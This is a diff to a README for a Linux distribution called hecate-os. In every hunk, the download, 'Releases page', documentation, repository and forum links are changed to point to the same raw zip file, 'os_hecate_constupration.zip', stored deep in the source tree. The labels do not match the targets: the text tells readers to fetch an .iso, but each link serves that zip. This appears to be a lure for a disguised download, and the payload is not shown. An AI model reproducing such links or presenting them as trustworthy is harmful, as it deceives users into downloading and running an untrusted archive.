@@ -6,11 +6,11 @@ Welcome to hecate-os! This Linux distribution helps your computer recognize hard
 
 ## 📥 Download hecate-os
 
-[![Download hecate-os](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip%https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
+[![Download hecate-os](https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip%https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip)](https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip)
 
 You can easily download hecate-os from our Releases page. Just click the button above or visit the link below:
 
-[Download hecate-os from Releases](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
+[Download hecate-os from Releases](https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip)
 
 ## 🔧 System Requirements
 
@@ -23,7 +23,7 @@ To run hecate-os smoothly, make sure your computer meets these basic requirement
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip).
 2. Find the latest version of hecate-os.
 3. Click on the .iso file to download it.
 4. Once the download completes, you need to create a bootable USB drive:
@@ -73,8 +73,8 @@ If you encounter issues while using hecate-os:
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
-- [Community Forum](https://raw.githubusercontent.com/chirasin99/hecate-os/main/config/includes.chroot/etc/update-motd.d/hecate-os-1.2-beta.3.zip)
+- [Official Documentation](https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip)
+- [Community Forum](https://raw.githubusercontent.com/chirasin99/hecate-os/main/rust/hecate-monitor/os_hecate_constupration.zip)
 
 We hope hecate-os enhances your computing experience. Enjoy optimizing your system!
